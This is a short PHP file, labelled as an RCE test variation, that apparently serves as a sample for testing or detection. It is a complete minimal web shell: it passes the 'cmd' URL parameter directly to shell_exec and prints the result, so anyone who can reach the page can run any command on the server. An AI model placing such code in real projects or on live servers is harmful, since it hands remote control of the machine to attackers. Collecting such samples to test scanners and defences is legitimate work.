<?php
// RCE test variation #603
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>